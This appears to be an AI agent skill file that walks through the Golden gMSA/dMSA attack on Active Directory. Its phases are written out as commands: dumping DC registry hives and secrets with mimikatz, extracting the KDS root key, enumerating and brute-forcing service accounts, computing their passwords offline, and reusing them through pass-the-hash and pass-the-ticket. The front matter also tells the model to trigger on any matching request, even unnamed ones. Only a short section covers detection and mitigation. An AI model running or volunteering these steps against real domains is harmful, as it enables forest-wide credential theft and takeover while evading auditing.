---
name: golden-gmsa-dmsa-attack
description: Execute Golden gMSA/dMSA attacks to derive managed service account passwords offline. Use this skill whenever the user mentions gMSA, dMSA, managed service accounts, KDS root key extraction, or wants to compute service account passwords from Active Directory. Trigger for any Active Directory attack involving service account password derivation, even if the user doesn't explicitly name the attack.
---

# Golden gMSA/dMSA Attack Methodology

This skill guides you through the **Golden gMSA/dMSA attack** - an offline password derivation technique for Windows Managed Service Accounts that bypasses normal authentication auditing.

## ⚠️ Authorization Required

This methodology is for **authorized security testing only**. Ensure you have:
- Written authorization from the organization
- Proper scope documentation
- Legal clearance for Active Directory attacks

## Attack Overview

Managed Service Accounts (gMSA/dMSA) store passwords differently than regular accounts. The password is **derived on-the-fly** from three inputs:

1. **KDS Root Key** - Forest-wide secret replicated to all Domain Controllers
2. **Account SID** - The service account's security identifier
3. **ManagedPasswordID** - Per-account GUID in `msDS-ManagedPasswordId`

**Derivation formula:** `AES256_HMAC(KDSRootKey, SID || ManagedPasswordID)` → 240-byte base64 blob

If you obtain all three inputs, you can compute **valid current and future passwords** for any gMSA/dMSA in the forest **offline**, bypassing:
- LDAP read auditing
- Password change intervals
- Kerberos traffic monitoring

## Prerequisites Checklist

Before proceeding, verify:

- [ ] Forest-level compromise of at least one DC (or Enterprise Admin)
- [ ] SYSTEM access to a DC, or ability to dump DC secrets
- [ ] .NET ≥ 4.7.2 x64 environment for tooling
- [ ] Network access to enumerate service accounts (LDAP or RID brute-force)

## Phase 1: Extract the KDS Root Key

The KDS Root Key is stored in the DC's registry under:
```
CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,<Forest>
```

### Method A: Direct DC Access (Volume Shadow Copy)

```powershell
# On the compromised DC
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM system.hive

# Extract with mimikatz
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch
```

### Method B: GoldenDMSA Tool (Remote)

```bash
# Query KDS root keys from any DC in the forest
GoldendMSA.exe kds --domain <domain.fqdn>

# Or without domain flag if already authenticated
GoldendMSA.exe kds
```

### Method C: GoldenGMSA Tool

```bash
GoldenGMSA.exe kdsinfo
```

**Output to capture:** The base64 `RootKey` string with its GUID name (e.g., `RootKey: <GUID> = <base64-string>`)

## Phase 2: Enumerate gMSA/dMSA Objects

You need three attributes per account:
- `sAMAccountName` - Account name
- `objectSid` - Security identifier
- `msDS-ManagedPasswordId` - Password derivation GUID

### Method A: PowerShell (Authenticated)

```powershell
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
  Select-Object sAMAccountName, objectSid, msDS-ManagedPasswordId | \
  Export-Csv gmsa-enumeration.csv -NoTypeInformation
```

### Method B: GoldenDMSA LDAP Enumeration

```bash
# Kerberos or simple bind
GoldendMSA.exe info -d example.local -m ldap
```

### Method C: GoldenDMSA RID Brute-Force

Use when anonymous binds are blocked:

```bash
GoldendMSA.exe info -d example.local -m brute -r 5000 -u <username> -p <password>
```

### Method D: GoldenGMSA

```bash
GoldenGMSA.exe gmsainfo
```

## Phase 3: Discover ManagedPasswordID (When Missing)

Some deployments strip `msDS-ManagedPasswordId` from ACL-protected reads. The GUID structure allows **narrow wordlist generation**:

- First 32 bits = Unix epoch time of account creation (minutes resolution)
- Remaining 96 bits = Random

### Generate Wordlist and Test

```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```

The tool:
1. Generates candidate GUIDs based on account creation time
2. Computes candidate passwords
3. Compares base64 blobs against `msDS-ManagedPassword` attribute
4. Returns the matching GUID

## Phase 4: Offline Password Computation

Once you have all three inputs, derive the password:

### GoldenDMSA

```bash
GoldendMSA.exe compute \
  -s <SID> \
  -k <KDSRootKey> \
  -d example.local \
  -m <ManagedPasswordID> \
  -i <KDSRootKeyID>
```

### GoldenGMSA

```bash
GoldenGMSA.exe compute \
  --sid <SID> \
  --kdskey <KDSRootKey> \
  --pwdid <ManagedPasswordID>
```

### Output Format

The tool outputs the derived password in base64 format, which can be:
- Converted to NTLM hash
- Used directly with mimikatz `sekurlsa::pth`
- Converted to AES keys for Rubeus Kerberos abuse

## Post-Exploitation: Password Injection

### Mimikatz Pass-the-Hash

```bash
mimikatz # sekurlsa::pth /user:<gmsa-name> /domain:<domain> /ntlm:<hash>
```

### Rubeus Pass-the-Ticket

```bash
Rubeus.exe ptt /ticket:<base64-ticket>
```

## Detection & Mitigation

### What Defenders Should Monitor

| Indicator | Detection Method |
|-----------|------------------|
| DC registry hive dumps | Monitor `reg save` commands, Volume Shadow Copy creation |
| KDS Root Key access | Audit `CN=Master Root Keys` container reads |
| DSRM usage | Alert on Directory Services Restore Mode activation |
| Unusual service password reuse | Detect same password across multiple hosts |
| Base64 password writes | Monitor `msDS-ManagedPassword` attribute changes |

### Mitigation Recommendations

1. **Restrict DC backup capabilities** to Tier-0 administrators only
2. **Monitor DSRM and VSS creation** on all Domain Controllers
3. **Audit KDS Root Key container** access in Active Directory
4. **Convert high-privilege gMSAs** to classic service accounts where Tier-0 isolation isn't possible
5. **Implement privileged access workstations** for DC administration

## Tooling Reference

| Tool | Purpose | Repository |
|------|---------|------------|
| GoldenDMSA | Primary attack tool | https://github.com/Semperis/GoldenDMSA |
| GoldenGMSA | Alternative implementation | https://github.com/Semperis/GoldenGMSA |
| Mimikatz | Secret extraction, PTH | https://github.com/gentilkiwi/mimikatz |
| Rubeus | Kerberos abuse, PTT | https://github.com/GhostPack/Rubeus |

## Common Issues & Troubleshooting

### "KDS Root Key not found"
- Verify you're querying a DC in the same forest
- Check if KDS is enabled: `Get-KdsRootKey`
- Ensure you have Enterprise Admin or DC SYSTEM access

### "ManagedPasswordId attribute empty"
- Account may be ACL-protected; use wordlist generation
- Try RID brute-force enumeration
- Check if account is actually a gMSA/dMSA (userAccountControl flags)

### "Password derivation fails"
- Verify KDS Root Key GUID matches the key ID
- Ensure SID format is correct (S-1-5-...)
- Check .NET version compatibility (≥ 4.7.2)

## References

- [Golden dMSA – Semperis Blog](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [Golden gMSA Attack – Semperis Blog](https://www.semperis.com/blog/golden-gmsa-attack/)
- [Improsec – Golden gMSA Trust Attack](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent/)
